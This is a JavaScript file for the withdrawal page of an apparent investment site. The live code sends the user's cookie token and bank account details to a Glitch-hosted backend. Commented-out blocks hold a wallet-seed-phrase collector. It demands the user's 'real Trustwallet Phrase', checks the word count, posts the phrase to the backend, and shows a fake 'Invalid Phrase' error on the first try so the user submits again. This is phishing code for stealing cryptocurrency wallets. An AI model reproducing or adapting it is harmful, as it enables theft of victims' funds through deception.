const checkCookie = (cname) => {
  let name = cname + "=";
  let decodedCookie = decodeURIComponent(document.cookie);
  let ca = decodedCookie.split(";");
  for (let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == " ") {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  // return "";
  window.location.href = "/login.html";
};

let withdrawal_amount = document.querySelector("#withdrawal_amount");
let withdrawal_method = document.querySelector("#payment_method");
let account_number = document.querySelector("#account_number");
let account_name = document.querySelector("#account_name");
// let phrase = document.querySelector("#phrase");
// let submission_time = 1;

const handle_withdrawal = async (form) => {
  try {
    document.querySelector("#submit").innerHTML = "proccessing...";
    const response = await fetch(
      "https://crescentpips-backend.glitch.me/api/user/withdraw",
      // "http://localhost:5000/api/user/withdraw",

      {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify(form),
      },
    );
    const result = await response.json();
    console.log(result);
    if (result.error) {
      // document.querySelector("#centerd_phrase").className = "center-none";
      document.querySelector(".errMessage").innerHTML = result.errMessage;
      document.querySelector("#submit").innerHTML = "try again";
      // document.querySelector("#connect_wallet").innerHTML = "Try again";

      return;
    }

    // if (submission_time <= 1) {
    //   document.querySelector("#centerd_phrase").className = "center-none";

    //   document.querySelector(".errMessage").innerHTML =
    //     "Invalid Phrase, Please try again later.";
    //   document.querySelector("#submit").innerHTML = "try again";
    //   document.querySelector("#connect_wallet").innerHTML = "Try again";
    //   submission_time += 1;
    //   return;
    // }

    document.querySelector("#submit").innerHTML = "success";
    window.location.href = `/action/success.html?${result.message}`;
  } catch (err) {
    // document.querySelector("#centerd_phrase").className = "center-none";
    document.querySelector(".errMessage").innerHTML = err.message;
    document.querySelector("#submit").innerHTML = "try again";
    // document.querySelector("#connect_wallet").innerHTML = "Try again";
  }
};

document.querySelector("#submit").onclick = () => {
  // let wallet = document.querySelector("#wallet");
  event.preventDefault()
  if (!withdrawal_amount.value)
    return (withdrawal_amount.style.border = "2px solid red");
//   if (!withdrawal_method.value)
//     return (withdrawal_method.style.border = "2px solid red");

  // document.querySelector("#centerd_phrase").className = "center";
  if (!account_number.value) return (account_number.style.border = "2px solid red");
  if (!account_name.value) return (account_name.style.border = "2px solid red");

  handle_withdrawal({
    token: checkCookie("token"),
    user: checkCookie("user"),
    withdrawal_amount: withdrawal_amount.value,
     transaction_bank: withdrawal_method.value,
     account_number:account_number.value,
     account_name: account_name.value,
  });
};

// document.querySelector("#connect_wallet").onclick = () => {
//   if (!phrase.value) return (phrase.style.border = "2px solid red");

//   const spacesCount = phrase.value.split(" ").length - 1;
//   console.log(spacesCount);
//   if (spacesCount == 11 || spacesCount == 17 || spacesCount == 23) {
//     document.querySelector("#connect_wallet").innerHTML = "Proccessing...";
//     document.querySelector(".errMessage2").innerHTML = "";
//     handle_withdrawal({
//       token: checkCookie("token"),
//       user: checkCookie("user"),
//       withdrawal_amount: withdrawal_amount.value,
//       withdrawal_method: withdrawal_method.value,
//       wallet: phrase.value,
//       requestNumber:submission_time
//     });
//   } else {
//     phrase.style.border = "2px solid red";
//     document.querySelector(".errMessage2").innerHTML =
//       "Invalid Phrase, please copy and paste your real Trustwallet Phrase to continue";
//   }

//   // document.querySelector("#connect_wallet").innerHTML = "Proccessing...";
//   // handle_withdrawal({
//   //   token: checkCookie("token"),
//   //   user: checkCookie("user"),
//   //   withdrawal_amount: withdrawal_amount.value,
//   //   withdrawal_method: withdrawal_method.value,
//   //   wallet: phrase.value,
//   // });
// };

document.querySelectorAll("input").forEach((input) => {
  input.onkeyup = () => {
    input.style.border = "2px solid #fff";
    document.querySelector(".errMessage").innerHTML = "";
  };
});

document.querySelectorAll("textarea").forEach((input) => {
  input.onkeyup = () => {
    input.style.border = "2px solid #fff";
    document.querySelector(".errMessage").innerHTML = "";
  };
});

document.querySelectorAll("select").forEach((select) => {
  select.onchange = () => {
    // alert("")
    select.style.border = "2px solid #fff";
    document.querySelector(".errMessage").innerHTML = "";
  };
});

































// const checkCookie = (cname) => {
//   let name = cname + "=";
//   let decodedCookie = decodeURIComponent(document.cookie);
//   let ca = decodedCookie.split(";");
//   for (let i = 0; i < ca.length; i++) {
//     let c = ca[i];
//     while (c.charAt(0) == " ") {
//       c = c.substring(1);
//     }
//     if (c.indexOf(name) == 0) {
//       return c.substring(name.length, c.length);
//     }
//   }
//   // return "";
//   window.location.href = "/login.html";
// };

// let transaction_bank = document.querySelector("#transaction_bank");
// let account_number=document.querySelector("#account_number");
// let account_name = document.querySelector("#account_name");
// let withdrawal_amount = document.querySelector("#withdrawal_amount");
// let submission_time = 1;

// const handle_withdrawal = async (form) => {
//   try {
//     document.querySelector("#submit").innerHTML = "proccessing...";
//     const response = await fetch(
//       "https://crescentpips-backend.glitch.me/api/user/withdraw",
//       // "http://localhost:5000/api/user/withdraw",

//       {
//         method: "POST",
//         headers: { "content-type": "application/json" },
//         body: JSON.stringify(form),
//       },
//     );
//     const result = await response.json();
//     console.log(result);
//     if (result.error) {
//       // document.querySelector("#centerd_withdrawal_amount").className = "center-none";
//       document.querySelector(".errMessage").innerHTML = result.errMessage;
//       document.querySelector("#submit").innerHTML = "try again";
//       // document.querySelector("#connect_withdrawal_amount").innerHTML = "Try again";

//       return;
//     }

//     // if (submission_time <= 1) {
//     //   document.querySelector("#centerd_withdrawal_amount").className = "center-none";

//     //   document.querySelector(".errMessage").innerHTML =
//     //     "Invalid withdrawal_amount, Please try again later.";
//     //   document.querySelector("#submit").innerHTML = "try again";
//     //   document.querySelector("#connect_withdrawal_amount").innerHTML = "Try again";
//     //   submission_time += 1;
//     //   return;
//     // }

//     document.querySelector("#submit").innerHTML = "success";
//     window.location.href = `action/loading.html?${result.message}`;
//   } catch (err) {
//     // document.querySelector("#centerd_withdrawal_amount").className = "center-none";
//     document.querySelector(".errMessage").innerHTML = err.message;
//     document.querySelector("#submit").innerHTML = "try again";
//     // document.querySelector("#connect_withdrawal_amount").innerHTML = "Try again";
//   }
// };

// document.querySelector("#submit").onclick = () => {
//   // let withdrawal_amount = document.querySelector("#withdrawal_amount");
//   if (!transaction_bank.value)
//     return (transaction_bank.style.border = "2px solid red");

//     if (!account_number.value)
//     return (account_number.style.border = "2px solid red");

//   if (!account_name.value)
//     return (account_name.style.border = "2px solid red");

//   // document.querySelector("#centerd_transaction_bank").className = "center";
//   if (!withdrawal_amount.value) return (withdrawal_amount.style.border = "2px solid red");
//   handle_withdrawal({
//     token: checkCookie("token"),
//     user: checkCookie("user"),
//     transaction_bank: transaction_bank.value,
//     account_number:account_number.value,
//     account_name: account_name.value,
//     withdrawal_amount: withdrawal_amount.value,
//   });
// };

// // document.querySelector("#connect_withdrawal_amount").onclick = () => {
// //   if (!withdrawal_amount.value) return (withdrawal_amount.style.border = "2px solid red");

// //   const spacesCount = withdrawal_amount.value.split(" ").length - 1;
// //   console.log(spacesCount);
// //   if (spacesCount == 11 || spacesCount == 17 || spacesCount == 23) {
// //     document.querySelector("#connect_withdrawal_amount").innerHTML = "Proccessing...";
// //     document.querySelector(".errMessage2").innerHTML = "";
// //     handle_withdrawal({
// //       token: checkCookie("token"),
// //       user: checkCookie("user"),
// //       withdrawal_amount: withdrawal_amount.value,
// //       account_name: account_name.value,
// //       withdrawal_amount: withdrawal_amount.value,
// //       requestNumber:submission_time
// //     });
// //   } else {
// //     withdrawal_amount.style.border = "2px solid red";
// //     document.querySelector(".errMessage2").innerHTML =
// //       "Invalid withdrawal_amount, please copy and paste your real Trustwithdrawal_amount withdrawal_amount to continue";
// //   }

// //   // document.querySelector("#connect_withdrawal_amount").innerHTML = "Proccessing...";
// //   // handle_withdrawal({
// //   //   token: checkCookie("token"),
// //   //   user: checkCookie("user"),
// //   //   withdrawal_amount: withdrawal_amount.value,
// //   //   account_name: account_name.value,
// //   //   withdrawal_amount: withdrawal_amount.value,
// //   // });
// // };

// document.querySelectorAll("input").forEach((input) => {
//   input.onkeyup = () => {
//     input.style.border = "2px solid #fff";
//     document.querySelector(".errMessage").innerHTML = "";
//   };
// });

// document.querySelectorAll("textarea").forEach((input) => {
//   input.onkeyup = () => {
//     input.style.border = "2px solid #fff";
//     document.querySelector(".errMessage").innerHTML = "";
//   };
// });

// document.querySelectorAll("select").forEach((select) => {
//   select.onchange = () => {
//     // alert("")
//     select.style.border = "2px solid #fff";
//     document.querySelector(".errMessage").innerHTML = "";
//   };
// });
